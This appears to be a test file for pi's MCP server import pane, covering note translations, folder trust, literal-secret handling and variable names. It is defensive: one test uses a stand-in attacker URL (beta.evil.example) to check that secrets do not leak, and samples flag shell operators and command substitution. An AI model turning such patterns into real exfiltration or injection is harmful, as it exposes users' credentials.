import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";
import { createJiti } from "jiti";

const jiti = createJiti(import.meta.url, { tsconfigPaths: true });
const {
  EMPTY_MCP_ADD_DRAFT,
  MCP_ADD_BREADTH_KEYS,
  MCP_ADD_EXAMPLES,
  MCP_ADD_PROJECT_BLOCK_KEYS,
  MCP_IMPORT_FIELD_REASON_KEYS,
  MCP_IMPORT_PROBLEM_KEYS,
  MCP_IMPORT_SOURCE_KEYS,
  mcpAddAnalysis,
  mcpAddDraftWithPaste,
  mcpAddOffersRawPi,
  mcpAddPreview,
  mcpAddProjectMode,
  mcpAddRequest,
  mcpFieldOptionalHeader,
  mcpFieldStoredAs,
  mcpFieldSuggestedVariableName,
  mcpFieldTakesVariable,
  mcpImportNoteKey,
  mcpImportNoteSeverity,
  mcpImportNoteText,
  mcpImportProblemKey,
  mcpSuggestedVariableName,
} = await jiti.import("./mcp-add-helpers.ts");
const { MCP_IMPORT_NOTE_CODES, parseMcpImport, fillMcpImportFields } = await jiti.import("@/lib/mcp-import.ts");
const { translateMessage } = await jiti.import("@/lib/i18n/format.ts");
const { getLocalePlugin, getSupportedLocales } = await jiti.import("@/lib/i18n/registry.ts");
const helperSource = await readFile(new URL("./mcp-add-helpers.ts", import.meta.url), "utf8");
const paneSource = await readFile(new URL("./McpAddServer.tsx", import.meta.url), "utf8");

const messages = Object.fromEntries(getSupportedLocales().map((id) => [id, getLocalePlugin(id).messages]));
const translator = (locale) => (key, params) => translateMessage(locale, key, messages, params);
const t = translator("en");

// One note per code, and one per variant, with the parameters the importer writes for it. A new
// code without a line here fails, so its words cannot be forgotten in any locale.
const SAMPLES = {
  "empty-input": [{}],
  "unrecognized-input": [{}],
  "invalid-json": [{ detail: "Unexpected end of JSON input" }],
  "no-servers-found": [{}],
  "shell-operator": [{ operator: "|" }],
  "shell-command-substitution": [{ syntax: "$(…)" }],
  "shell-multiple-commands": [{}],
  "shell-unterminated-quote": [{ quote: '"' }],
  "shell-parameter": [{ parameter: "$1" }],
  "shell-expansion": [{ expansion: "*" }],
  "unsupported-url-scheme": [{ scheme: "ftp" }],
  "github-repo-link": [{ repository: "acme/tools" }],
  "github-mcp-page": [{ name: "acme/tools" }],
  "github-page": [{}],
  "by-name-link": [{ name: "io.github.acme/tools" }],
  "badge-image": [{}],
  "install-link-invalid": [{ detail: "config" }],
  "claude-desktop-import": [{}],
  "cli-unsupported": [{ cli: "cursor" }],
  "cli-usage": [{ cli: "pi" }],
  "cli-unknown-option": [{ cli: "pi", option: "--frobnicate" }],
  "cli-option-needs-value": [{ cli: "claude", option: "--env" }],
  "cli-option-wrong-transport": [{ cli: "claude", option: "--env", transport: "http" }],
  "cli-invalid-pair": [{ cli: "pi", option: "--env", value: "NOPE" }],
  "cli-not-a-server": [{ cli: "pi", command: "mcp remove" }],
  "pi-help": [{}],
  "field-required": [{ field: "env.TOKEN" }],
  "field-invalid-option": [{ field: "input.region" }],
  "field-reference-invalid": [{ field: "env.TOKEN", problem: "name" }, { field: "args.1", problem: "target" }, { field: "env.TOKEN", problem: "missing" }],
  "sse-transport": [{ server: "old", url: "https://x/sse" }, { url: "https://x/sse", suggestedUrl: "https://x/mcp" }, {}],
  "websocket-transport": [{ server: "ws", url: "wss://x" }, {}],
  "unsupported-transport": [{ server: "x", type: "grpc" }, { type: "grpc" }],
  "ambiguous-command-and-url": [{ server: "x" }, {}],
  "no-command-or-url": [{ server: "x" }, {}],
  "zed-extension-server": [{ server: "zed-thing" }],
  "registry-packages-unsupported": [{ server: "io.acme/x" }, {}],
  "invalid-config": [
    { server: "x", problem: "name", name: "bad name" },
    { server: "x", problem: "url", url: "ftp://x" },
    { server: "x", problem: "args", index: 2 },
    { server: "x", problem: "args" },
    { server: "x", problem: "tool-exposure", tool: "search" },
    { server: "x", problem: "callback-port", value: "99999" },
  ],
  "dropped-key": [{ key: "autoApprove" }],
  "variable-unsupported-here": [{ field: "args[1]", name: "HOME_DIR" }],
  "variable-fallback-dropped": [{ field: "env.A", name: "B", fallback: "c" }],
  "bare-dollar-literal": [{ field: "env.A", name: "TOKEN" }],
  "header-env-reference": [{ header: "Authorization", names: "GH_TOKEN" }],
  "client-secret-env-reference": [{ names: "SECRET" }],
  "shell-command-value": [{ field: "env.TOKEN" }],
  "shell-variable": [{ field: "env.TOKEN", name: "TOKEN" }],
  "unsupported-variable": [{ field: "cwd", variable: "${workspaceFolderBasename}" }],
  "input-undefined": [{ id: "pat" }],
  "input-command-unsupported": [{ id: "pick" }],
  "timeout-clamped": [{ from: 9000, to: 3600 }],
  "timeout-dropped": [{ value: "soon" }],
  "timeout-unit-guessed": [{ value: 30000, unit: "milliseconds" }, { value: 30, unit: "seconds" }],
  "env-null-dropped": [{ name: "PATH" }],
  "oauth-option-dropped": [{ key: "auth.audience" }],
  "oauth-disable-unsupported": [{}],
  "callback-url-dropped": [{ value: "https://x/cb" }],
  "callback-port-dropped": [{ value: "x" }],
  "invalid-exposure-dropped": [{ value: "public" }],
  "tool-filter-imported": [{ mode: "include", tools: "a, b" }, { mode: "exclude", tools: "c" }],
  "transport-guessed": [{}],
  "insecure-http": [{ host: "mcp.example.com" }],
  "literal-secret": [{ field: "headers.Authorization" }],
  "cli-option-ignored": [{ cli: "codex", option: "--model" }],
  "cli-option-as-arg": [{ cli: "claude", option: "--verbose" }],
  "cli-extra-arguments": [{ cli: "claude", arguments: "--x y" }],
  "mcp-remote-bridge": [{ url: "https://x/mcp" }],
  "looks-like-pi-config": [{}],
  "workspace-folder-relative": [{ field: "cwd", from: "${workspaceFolder}" }],
  "home-variable-translated": [{ field: "env.A", from: "${userHome}", to: "${HOME}" }],
  "name-taken": [{ name: "docs", suggestedName: "docs-2" }],
  "escaped-value": [{ field: "env.A" }],
  "variable-translated": [{ field: "env.A", from: "${env:A}", to: "${A}" }],
  "home-translated": [{ field: "args[0]", from: "$HOME" }],
  "timeout-converted": [{ from: 30000, to: 30 }],
  "env-value-stringified": [{ name: "PORT" }],
  "empty-authorization-dropped": [{}],
  "imported-disabled": [{}],
  "name-derived": [{ name: "github" }],
  "name-sanitized": [{ original: "My Server!", name: "My-Server" }],
  "name-deduplicated": [{ original: "x", name: "x-2" }],
  "command-split": [{ command: "npx -y x" }],
  "transport-assumed-http": [{}],
  "scheme-assumed": [{ url: "http://localhost:3000/mcp" }],
  "client-secret-prompt": [{}],
  "userinfo-moved-to-header": [{}],
};

test("every importer note has words in every locale, each variant included, with nothing left to fill in", () => {
  assert.deepEqual(Object.keys(SAMPLES).sort(), [...MCP_IMPORT_NOTE_CODES].sort(), "one sample per note code");
  assert.equal(MCP_IMPORT_NOTE_CODES.length, 84);
  for (const locale of getSupportedLocales()) {
    const translate = translator(locale);
    for (const [code, samples] of Object.entries(SAMPLES)) {
      for (const params of samples) {
        const note = { code, params };
        const key = mcpImportNoteKey(note);
        assert.equal(typeof messages[locale][key], "string", `${locale} ${key}`);
        // Every placeholder of the words is one the note carries (the server goes in front of them).
        for (const [, name] of messages[locale][key].matchAll(/\{([\w.-]+)\}/g)) {
          assert.ok(name in params && name !== "server", `${locale} ${key} needs {${name}}`);
        }
        const text = mcpImportNoteText(note, translate);
        assert.ok(!text.includes(key), `${locale} ${code} has its own words`);
        if (code === "invalid-config") assert.doesNotMatch(text, /\{(?:name|url|index|tool|value)\}/, `${locale} ${code}: ${text}`);
      }
    }
    for (const key of [
      ...MCP_IMPORT_PROBLEM_KEYS,
      ...Object.values(MCP_IMPORT_FIELD_REASON_KEYS),
      ...Object.values(MCP_IMPORT_SOURCE_KEYS),
      ...Object.values(MCP_ADD_PROJECT_BLOCK_KEYS),
      ...Object.values(MCP_ADD_BREADTH_KEYS),
    ]) {
      assert.equal(typeof messages[locale][key], "string", `${locale} ${key}`);
    }
  }
});

test("every invalid-config problem the importer's validator names has its words", async () => {
  const core = await readFile(new URL("../lib/mcp-import-core.ts", import.meta.url), "utf8");
  const validator = core.slice(core.indexOf("export function validationProblem"));
  const problems = new Set([...validator.matchAll(/problem: "([a-z-]+)"/g)].map((match) => match[1]));
  for (const problem of problems) assert.ok(MCP_IMPORT_PROBLEM_KEYS.includes(`mcp.importProblem.${problem}`), problem);
  assert.equal(mcpImportProblemKey({ problem: "tool-exposure", tool: "x" }), "mcp.importProblem.tool-exposure.tool");
  assert.equal(mcpImportProblemKey({ problem: "args", index: 0 }), "mcp.importProblem.args.index");
});

test("a note names the server it is about, a field by its label, and the validator's problem in words", () => {
  assert.equal(
    mcpImportNoteText({ code: "zed-extension-server", params: { server: "zed-thing" } }, t),
    "zed-thing: It comes from a Zed extension, which only Zed can start.",
  );
  const fields = [{ id: "input.pat", kind: "password", reason: "input", label: "GitHub PAT", targets: [] }];
  assert.equal(mcpImportNoteText({ code: "field-required", params: { field: "input.pat" } }, t, fields), "Fill in GitHub PAT.");
  assert.equal(
    mcpImportNoteText({ code: "invalid-config", params: { server: "x", problem: "args", index: 2 } }, t),
    "x: pi would refuse it: args[2] is not text.",
  );
  assert.equal(
    mcpImportNoteText({ code: "cli-option-wrong-transport", params: { cli: "claude", option: "--env", transport: "http" } }, t),
    "The claude option --env does not apply to HTTP servers.",
  );
  // Source text shows its hidden characters.
  assert.match(mcpImportNoteText({ code: "dropped-key", params: { key: "a‮b" } }, t), /a\\u\{202E\}b/);
});

// ---------------------------------------------------------------------------

const globalFile = { scope: "global", path: "/Users/me/.pi/agent/mcp.json", exists: true, problems: [] };
const projectFile = { scope: "project", path: "/Users/me/repo/.pi/mcp.json", exists: false, problems: [] };
const fresh = { requiresTrust: false, trusted: true, decision: null, inherited: false };

function overview({ trust = fresh, trustFolder = { allowed: true }, servers = [], mcp = { available: true }, files } = {}) {
  return {
    mcp,
    codemode: { sandbox: { state: "available" }, builtinDisabled: false, preference: "automatic" },
    files: files ?? [globalFile, projectFile],
    servers,
    project: { cwd: "/Users/me/repo", trust, ...(trustFolder ? { trustFolder } : {}) },
  };
}

const draft = (overrides) => ({ ...EMPTY_MCP_ADD_DRAFT, ...overrides });
const analyse = (overrides, data = overview(), cwd = "/Users/me/repo") => mcpAddAnalysis(draft(overrides), data, cwd);

test("a project server is written where a decision trusts the folder, trusted with it when fresh, or not at all", () => {
  const cwd = "/Users/me/repo";
  assert.deepEqual(mcpAddProjectMode(overview(), cwd), { kind: "trust-and-write", folder: cwd });
  assert.deepEqual(mcpAddProjectMode(overview({ trust: { ...fresh, decision: true, decisionPath: "/Users/me", inherited: true }, trustFolder: null }), cwd), { kind: "write" });
  assert.deepEqual(mcpAddProjectMode(overview({ trust: { requiresTrust: true, trusted: true, decision: true, decisionPath: cwd, inherited: false }, trustFolder: null }), cwd), { kind: "write" });
  const block = (data, at = cwd) => mcpAddProjectMode(data, at).block;
  assert.deepEqual(block(overview(), null), { kind: "no-project" });
  assert.deepEqual(block({ ...overview(), project: undefined }), { kind: "project-not-listed" });
  assert.deepEqual(block(overview({ trust: { requiresTrust: true, trusted: false, decision: null, inherited: false }, trustFolder: null })), { kind: "project-untrusted", trustable: true });
  assert.deepEqual(block(overview({ trust: { ...fresh, decision: false, decisionPath: "/Users", inherited: true }, trustFolder: null })), { kind: "untrusted-decision" });
  assert.deepEqual(block(overview({ trust: { ...fresh, decisionError: "locked" }, trustFolder: null })), { kind: "trust-unreadable" });
  assert.deepEqual(block({ ...overview(), project: { cwd } }), { kind: "trust-unreadable" });
  const breadth = { kind: "contains-folder", path: "/Users/me/repo/app" };
  assert.deepEqual(block(overview({ trustFolder: { allowed: false, reason: "trust-too-broad", breadth } })), { kind: "trust-too-broad", breadth });
  assert.deepEqual(block(overview({ trustFolder: { allowed: false, reason: "folder-not-fresh" } })), { kind: "folder-not-fresh" });
});

test("the analysis previews the paste, and Add trusts a fresh folder only for a project server", () => {
  const global = analyse({ text: "npx -y @scope/lint-mcp" });
  assert.equal(global.scope, "global");
  assert.equal(global.name, "lint");
  assert.equal(global.submitBlock, undefined);
  assert.equal(global.trustFolder, false);
  assert.deepEqual(mcpAddRequest(draft({ text: "npx -y @scope/lint-mcp" }), global), {
    action: "add", text: "npx -y @scope/lint-mcp", values: {}, server: 0, name: "lint", scope: "global", rawPi: false,
  });
  const project = analyse({ text: "npx -y @scope/lint-mcp", scope: "project" });
  assert.equal(project.trustFolder, true);
  assert.equal(mcpAddRequest(draft({ text: "npx -y @scope/lint-mcp", scope: "project" }), project).trustFolder, true);
  assert.deepEqual(mcpAddRequest(draft({ text: "x" }), project, ["GH_TOKEN"]).confirmHostEnv, ["GH_TOKEN"]);
  // The paste's own scope hint picks a project a decision already trusts, and global anywhere else:
  // pasted text never preselects trusting a fresh folder.
  const trustedRepo = overview({ trust: { requiresTrust: true, trusted: true, decision: true, decisionPath: "/Users/me/repo", inherited: false }, trustFolder: null });
  assert.equal(analyse({ text: "pi mcp add -l lint -- npx lint-mcp" }, trustedRepo).scope, "project");
  const fromReadme = analyse({ text: "pi mcp add -l lint -- npx lint-mcp" });
  assert.equal(fromReadme.scope, "global", "a fresh folder");
  assert.equal(fromReadme.trustFolder, false);
  assert.equal(analyse({ text: "pi mcp add -l lint -- npx lint-mcp" }, overview(), null).scope, "global");
  const secret = analyse({ text: "pi mcp add -l gh --env GITHUB_TOKEN=ghp_0123456789abcdefghijklmnopqrstuvwxyz01 -- npx gh-mcp" }, trustedRepo);
  assert.equal(secret.scope, "global", "nor where its literal secret keeps it out of the project");
  assert.deepEqual(secret.projectBlock, { kind: "secret", fields: ["env.GITHUB_TOKEN"], fixed: false });
  assert.equal(secret.submitBlock, undefined);
});

test("a literal secret keeps the Project option closed, unless the value is read from a variable", () => {
  const text = JSON.stringify({ mcpServers: { gh: { command: "npx", args: ["gh-mcp"], env: { GITHUB_TOKEN: "YOUR_TOKEN" } } } });
  // Typed or not yet, a password field is a secret in the file.
  assert.deepEqual(analyse({ text }).projectBlock, { kind: "secret", fields: ["env.GITHUB_TOKEN"], fixed: false });
  const typed = analyse({ text, scope: "project", values: { "env.GITHUB_TOKEN": "ghp_x" } });
  assert.deepEqual(typed.submitBlock, { kind: "scope", block: { kind: "secret", fields: ["env.GITHUB_TOKEN"], fixed: false } });
  // A variable being named is not a secret yet either way.
  assert.equal(analyse({ text, references: { "env.GITHUB_TOKEN": "" } }).projectBlock, undefined);
  const referenced = analyse({ text, scope: "project", references: { "env.GITHUB_TOKEN": "GITHUB_TOKEN" } });
  assert.equal(referenced.projectBlock, undefined);
  assert.equal(referenced.submitBlock, undefined);
  assert.deepEqual(referenced.values, { "env.GITHUB_TOKEN": { reference: "GITHUB_TOKEN" } });
  assert.equal(referenced.fill.config.env.GITHUB_TOKEN, "${GITHUB_TOKEN}");
});

test("every format the importer reads has one example, read as that format with nothing left to fill in", () => {
  assert.deepEqual(MCP_ADD_EXAMPLES.map(({ source }) => source).sort(), Object.keys(MCP_IMPORT_SOURCE_KEYS).sort());
  for (const { source, text } of MCP_ADD_EXAMPLES) {
    const result = parseMcpImport(text);
    assert.ok(result.ok, `${source}: ${JSON.stringify(result.notes)}`);
    assert.equal(result.servers.length, 1, source);
    const [server] = result.servers;
    assert.equal(server.source, source, text);
    assert.deepEqual(server.fields, [], `${source} asks for nothing`);
    assert.deepEqual([...result.notes, ...server.notes].filter((note) => mcpImportNoteSeverity(note) !== "info"), [], `${source} reads cleanly`);
  }
  // The install links carry the fetch server, which the preview shows as written.
  const cursor = parseMcpImport(MCP_ADD_EXAMPLES.find(({ source }) => source === "cursor-install-link").text).servers[0];
  assert.deepEqual([cursor.name, cursor.config], ["fetch", { command: "uvx", args: ["mcp-server-fetch"] }]);
});

test("a field says what is stored around it only where it is part of a longer value", () => {
  const github = parseMcpImport(`claude mcp add-json github '{"type":"http","url":"https://api.githubcopilot.com/mcp","headers":{"Authorization":"Bearer YOUR_GITHUB_PAT"}}'`).servers[0];
  const [pat] = github.fields;
  assert.equal(mcpFieldStoredAs(pat, github.fields, "‹your value›"), "Bearer ‹your value›");
  assert.equal(mcpFieldStoredAs(pat, github.fields, "${GH_TOKEN}", true), "Bearer ${GH_TOKEN}");
  assert.equal(mcpFieldOptionalHeader(pat), "Authorization");

  const whole = parseMcpImport(JSON.stringify({ mcpServers: { api: { command: "npx", args: ["api"], env: { API_KEY: "<your-api-key>" } } } })).servers[0];
  assert.equal(mcpFieldStoredAs(whole.fields[0], whole.fields, "‹your value›"), undefined, "the box says it all");
  assert.equal(mcpFieldStoredAs(whole.fields[0], whole.fields, "${API_KEY}", true), "${API_KEY}");
  assert.equal(mcpFieldOptionalHeader(whole.fields[0]), undefined);

  // Another field in the same value shows as its label, and a value said twice is said once.
  const tenant = { id: "tenant", kind: "text", reason: "registry-variable", label: "tenant", targets: [] };
  const region = {
    id: "region", kind: "text", reason: "registry-variable", label: "region", targets: [
      { path: ["url"], parts: ["https://", { field: "region" }, ".example.com/", { field: "tenant" }] },
      { path: ["headers", "X-Region"], parts: ["r-", { field: "region" }] },
      { path: ["headers", "X-Region-2"], parts: ["r-", { field: "region" }] },
    ],
  };
  assert.equal(mcpFieldStoredAs(region, [region, tenant], "‹your value›"), "https://‹your value›.example.com/‹tenant›, r-‹your value›");
  assert.equal(mcpFieldOptionalHeader(region), undefined, "not one header alone");
});

test("an optional password field left blank is no secret: it is left out, as the route leaves it out", () => {
  const text = JSON.stringify({ mcpServers: { linear: { url: "https://mcp.linear.app/mcp", headers: { "X-Api-Key": "" } } } });
  const blank = analyse({ text, scope: "project" });
  const field = blank.server.fields[0];
  assert.deepEqual([field.id, field.kind, field.optional], ["headers.X-Api-Key", "password", true]);
  assert.deepEqual(blank.secretPaths, []);
  assert.equal(blank.projectBlock, undefined);
  assert.equal(blank.submitBlock, undefined, "Project stays available, and the route accepts it");
  const typed = analyse({ text, scope: "project", values: { "headers.X-Api-Key": "lin_api_x" } });
  assert.deepEqual(typed.submitBlock, { kind: "scope", block: { kind: "secret", fields: ["headers.X-Api-Key"], fixed: false } }, "once typed, it counts");
});

test("a literal secret in the paste can be read from a variable instead, which opens the project", () => {
  const text = JSON.stringify({ mcpServers: { api: { url: "https://api.example.com/mcp", headers: { Authorization: "Bearer sk-live-0123456789abcdef0123" } } } });
  const written = analyse({ text, scope: "project" });
  assert.deepEqual(written.pasteSecrets, ["headers.Authorization"]);
  assert.deepEqual(written.projectBlock, { kind: "secret", fields: ["headers.Authorization"], fixed: false });
  // Being named, it is a variable all the same.
  assert.equal(analyse({ text, scope: "project", secretReferences: { "headers.Authorization": "" } }).projectBlock, undefined);
  const stored = analyse({ text, scope: "project", secretReferences: { "headers.Authorization": "API_TOKEN" } });
  assert.equal(stored.projectBlock, undefined);
  assert.equal(stored.submitBlock, undefined);
  assert.equal(stored.fill.config.headers.Authorization, "Bearer ${API_TOKEN}");
  const body = mcpAddRequest(draft({ text, scope: "project", secretReferences: { "headers.Authorization": "API_TOKEN" } }), stored);
  assert.deepEqual(body.secretReferences, { "headers.Authorization": "API_TOKEN" });
  assert.equal(body.trustFolder, true);
  // A secret where pi reads no variable keeps it global, and the reason says why.
  const inUrl = analyse({ text: "https://api.example.com/mcp?api_key=abcdef0123456789abcdef01" });
  assert.deepEqual(inUrl.pasteSecrets, []);
  assert.deepEqual(inUrl.projectBlock, { kind: "secret", fields: ["url"], fixed: true });
});

test("a variable name pi does not accept is said under its box, not as a value still to fill in", () => {
  const text = JSON.stringify({ mcpServers: { gh: { command: "npx", args: ["gh"], env: { GITHUB_TOKEN: "YOUR_TOKEN" } } } });
  const bad = analyse({ text, references: { "env.GITHUB_TOKEN": "my-token" } });
  assert.deepEqual(bad.submitBlock, { kind: "field-invalid", fields: ["GITHUB_TOKEN"] });
  assert.deepEqual(bad.fieldProblems, { "env.GITHUB_TOKEN": { code: "field-reference-invalid", params: { field: "env.GITHUB_TOKEN", problem: "name" } } });
  assert.match(mcpImportNoteText(bad.fieldProblems["env.GITHUB_TOKEN"], t, bad.server.fields), /^GITHUB_TOKEN: a variable name has letters/);
  // Unanswered, it is still to fill in, and nothing is said under the box.
  const unanswered = analyse({ text });
  assert.deepEqual(unanswered.submitBlock, { kind: "fields", fields: ["GITHUB_TOKEN"] });
  assert.deepEqual(unanswered.fieldProblems, {});
  const secret = JSON.stringify({ mcpServers: { api: { url: "https://api.example.com/mcp", headers: { Authorization: "Bearer sk-live-0123456789abcdef0123" } } } });
  const badSecret = analyse({ text: secret, secretReferences: { "headers.Authorization": "9TOKEN" } });
  assert.deepEqual(badSecret.submitBlock, { kind: "field-invalid", fields: ["headers.Authorization"] });
  assert.equal(badSecret.fieldProblems["headers.Authorization"].params.problem, "name");
});

test("an empty variable box asks for a name, as a value still to fill in, never as a name pi refuses", () => {
  const secret = JSON.stringify({ mcpServers: { api: { command: "npx", args: ["api"], env: { API_TOKEN: "sk-live-0123456789abcdef0123" } } } });
  const empty = analyse({ text: secret, secretReferences: { "env.API_TOKEN": "" } });
  assert.deepEqual(empty.fieldProblems, { "env.API_TOKEN": { code: "field-reference-invalid", params: { field: "env.API_TOKEN", problem: "missing" } } });
  assert.equal(mcpImportNoteKey(empty.fieldProblems["env.API_TOKEN"]), "mcp.importNote.field-reference-invalid.missing");
  assert.equal(mcpImportNoteText(empty.fieldProblems["env.API_TOKEN"], t), "env.API_TOKEN: enter the name of the variable to read it from.");
  assert.deepEqual(empty.submitBlock, { kind: "fields", fields: ["env.API_TOKEN"] });
  // Blank space is nothing typed yet too; text that is no variable name is the name problem.
  assert.equal(analyse({ text: secret, secretReferences: { "env.API_TOKEN": "  " } }).fieldProblems["env.API_TOKEN"].params.problem, "missing");
  assert.equal(analyse({ text: secret, secretReferences: { "env.API_TOKEN": "api-token" } }).fieldProblems["env.API_TOKEN"].params.problem, "name");

  const field = JSON.stringify({ mcpServers: { gh: { command: "npx", args: ["gh"], env: { GITHUB_TOKEN: "YOUR_TOKEN" } } } });
  const emptyField = analyse({ text: field, references: { "env.GITHUB_TOKEN": "" } });
  assert.equal(emptyField.fieldProblems["env.GITHUB_TOKEN"].params.problem, "missing");
  assert.match(mcpImportNoteText(emptyField.fieldProblems["env.GITHUB_TOKEN"], t, emptyField.server.fields), /^GITHUB_TOKEN: enter the name/);
  assert.deepEqual(emptyField.submitBlock, { kind: "fields", fields: ["GITHUB_TOKEN"] });
  // The route reads the same fill: a reference that is not text is a name problem, not an empty box.
  assert.equal(fillMcpImportFields(emptyField.server, { "env.GITHUB_TOKEN": { reference: 7 } }).notes[0].params.problem, "name");
});

test("a variable box opens with a name pi accepts: an env value's own, or one made from the server's for a header or client secret", () => {
  assert.equal(mcpSuggestedVariableName("env.API_TOKEN", "api"), "API_TOKEN");
  assert.equal(mcpSuggestedVariableName("env.github_token", "gh"), "github_token", "a valid env name as written");
  assert.equal(mcpSuggestedVariableName("env.api-token", "x"), "API_TOKEN");
  assert.equal(mcpSuggestedVariableName("headers.Authorization", "docs"), "DOCS_TOKEN");
  assert.equal(mcpSuggestedVariableName("headers.proxy-authorization", "docs"), "DOCS_TOKEN");
  assert.equal(mcpSuggestedVariableName("headers.X-Api-Key", "brave-search"), "BRAVE_SEARCH_API_KEY");
  assert.equal(mcpSuggestedVariableName("headers.Api-Key", "docs"), "DOCS_API_KEY");
  assert.equal(mcpSuggestedVariableName("oauth.clientSecret", "my.server"), "MY_SERVER_CLIENT_SECRET");
  // A server name that cannot start one is left out rather than offered as a name pi refuses.
  assert.equal(mcpSuggestedVariableName("headers.Authorization", "1password"), "TOKEN");
  assert.equal(mcpSuggestedVariableName("headers.Authorization", ""), "TOKEN");
  // Nothing to offer: the box then opens empty and asks for a name.
  assert.equal(mcpSuggestedVariableName("env.9", "x"), undefined);
  assert.equal(mcpSuggestedVariableName("url", "x"), undefined);
  // Never the variable Add refuses.
  assert.equal(mcpSuggestedVariableName("env.PI_WEB_PASSWORD", "x"), undefined);
  assert.equal(mcpSuggestedVariableName("headers.X-Password", "pi-web"), undefined);
  for (const [label, server] of [["env.A", "x"], ["headers.Authorization", "a b"], ["headers.-", "z"], ["oauth.clientSecret", "é"]]) {
    const name = mcpSuggestedVariableName(label, server);
    assert.ok(name === undefined || /^[A-Za-z_][A-Za-z0-9_]*$/.test(name), `${label} ${server}: ${name}`);
  }

  // A field is offered the name of the place its value goes.
  const env = parseMcpImport(JSON.stringify({ mcpServers: { gh: { command: "npx", args: ["gh"], env: { GITHUB_TOKEN: "YOUR_TOKEN" } } } })).servers[0];
  assert.equal(mcpFieldSuggestedVariableName(env.fields[0], env.name), "GITHUB_TOKEN");
  const header = parseMcpImport(JSON.stringify({
    servers: { gh: { type: "http", url: "https://api.example.com/mcp", headers: { Authorization: "Bearer ${input:pat}" } } },
    inputs: [{ id: "pat", type: "promptString", password: true }],
  })).servers[0];
  assert.equal(mcpFieldSuggestedVariableName(header.fields[0], "gh"), "GH_TOKEN");
  // What the box opens with is a reference the analysis takes as it is.
  const opened = analyse({ text: JSON.stringify({ mcpServers: { api: { command: "npx", args: ["api"], env: { API_TOKEN: "sk-live-0123456789abcdef0123" } } } }), secretReferences: { "env.API_TOKEN": mcpSuggestedVariableName("env.API_TOKEN", "api") } });
  assert.deepEqual(opened.fieldProblems, {});
  assert.equal(opened.fill.config.env.API_TOKEN, "${API_TOKEN}");
});

test("a paste replaced by another server's drops what was typed for the first; an edit of the same server keeps it", () => {
  const alpha = JSON.stringify({ mcpServers: { alpha: { url: "https://alpha.example.com/mcp", headers: { Authorization: "Bearer YOUR_API_KEY" } } } });
  const beta = JSON.stringify({ mcpServers: { beta: { url: "https://beta.evil.example/mcp", headers: { Authorization: "Bearer YOUR_API_KEY" } } } });
  const typed = draft({ text: alpha, name: "alpha-renamed", values: { "headers.Authorization": "sk-secret-for-alpha" }, references: { x: "X" }, secretReferences: { y: "Y" }, scope: "project" });
  const replaced = mcpAddDraftWithPaste(typed, { text: beta });
  assert.deepEqual(replaced, draft({ text: beta, scope: "project" }), "the scope picked is the user's, the rest was for alpha");
  const body = mcpAddRequest(replaced, mcpAddAnalysis(replaced, overview(), null));
  assert.equal(body.name, "beta");
  assert.deepEqual(body.values, {}, "no secret typed for alpha goes to beta's URL");
  assert.ok(!JSON.stringify(body).includes("sk-secret-for-alpha"));

  // The same server, reformatted or read as pi syntax: still alpha at the same URL.
  const reformatted = JSON.stringify(JSON.parse(alpha), null, 2);
  assert.deepEqual(mcpAddDraftWithPaste(typed, { text: reformatted }), { ...typed, text: reformatted });
  assert.deepEqual(mcpAddDraftWithPaste(typed, { rawPi: true }), { ...typed, rawPi: true });
  // A text that holds no server keeps nothing either: what comes next may be anything.
  assert.deepEqual(mcpAddDraftWithPaste(typed, { text: alpha.slice(0, 20) }).values, {});
  // A paste of several keeps the server picked while that one stays as it was.
  const two = JSON.stringify({ mcpServers: { one: { command: "npx", args: ["one"] }, two: { url: "https://two.example.com/mcp", headers: { Authorization: "Bearer YOUR_KEY" } } } });
  const picked = draft({ text: two, server: 1, values: { "headers.Authorization": "k" } });
  const oneEdited = two.replace('"one"]', '"one", "--x"]');
  assert.deepEqual(mcpAddDraftWithPaste(picked, { text: oneEdited }), { ...picked, text: oneEdited });
});

test("Add waits, with a reason, for a free valid name, the values, and a scope it may write", () => {
  const taken = analyse({ text: "https://mcp.example.com/mcp", name: "docs" }, overview({ servers: [{ name: "docs", scope: "global" }] }));
  assert.deepEqual(taken.submitBlock, { kind: "name-taken", name: "docs", suggestedName: "docs-2", path: globalFile.path });
  assert.deepEqual(analyse({ text: "https://mcp.example.com/mcp", name: "a b" }).submitBlock, { kind: "name-invalid" });
  const text = JSON.stringify({ servers: { gh: { type: "http", url: "https://api.example.com/mcp", headers: { Authorization: "Bearer ${input:pat}" } } }, inputs: [{ id: "pat", type: "promptString", password: true, description: "GitHub PAT" }] });
  assert.deepEqual(analyse({ text }).submitBlock, { kind: "fields", fields: ["pat"] });
  assert.deepEqual(analyse({ text: "nothing to see | here" }).submitBlock, { kind: "nothing" });
  const password = analyse({ text: JSON.stringify({ mcpServers: { pw: { url: "https://pw/mcp", headers: { A: "${PI_WEB_PASSWORD}" } } } }), rawPi: true });
  assert.deepEqual(password.submitBlock, { kind: "web-password" });
  const broken = analyse({ text: "npx x" }, overview({ files: [{ ...globalFile, problems: [{ reason: "unparsable", error: "x" }] }, projectFile] }));
  assert.deepEqual(broken.submitBlock, { kind: "scope", block: { kind: "file-problem", path: globalFile.path, reason: "unparsable" } });
  const off = analyse({ text: "npx -y @scope/lint-mcp" }, overview({ mcp: { available: false, reason: "operator-disabled", error: "x" } }));
  assert.deepEqual(off.submitBlock, { kind: "mcp-off" });
  assert.ok(off.preview, "MCP off still shows what the paste holds");
  // -builtin:mcp leaves the files writable, as for every change.
  assert.equal(analyse({ text: "npx x" }, overview({ mcp: { available: false, reason: "builtin-disabled", error: "x" } })).submitBlock, undefined);
});

test("a config pi's validator refuses once the values are filled in blocks Add, worded as the importer words it", () => {
  const text = "https://<your-server>/mcp";
  const [field] = parseMcpImport(text).servers[0].fields;
  const blocked = analyse({ text, values: { [field.id]: "my server" } });
  assert.equal(blocked.submitBlock?.kind, "config-invalid");
  assert.equal(blocked.submitBlock.note.code, "invalid-config");
  assert.equal(blocked.submitBlock.note.params.url, blocked.preview.target, "the URL as the preview shows it");
  assert.equal(mcpImportNoteText(blocked.submitBlock.note, t), "pi would refuse it: https://my server/mcp is not an http or https URL.");
  // A value that makes a valid URL does not.
  assert.equal(analyse({ text, values: { [field.id]: "mcp.example.com" } }).submitBlock, undefined);

  // A password typed into the same URL stays hidden in the block's words, as in the preview.
  const both = "https://<your-server>/mcp?api_key=YOUR_KEY";
  const fields = parseMcpImport(both).servers[0].fields;
  const keyField = fields.find((item) => item.kind === "password");
  const hostField = fields.find((item) => item !== keyField);
  assert.ok(keyField && hostField, JSON.stringify(fields));
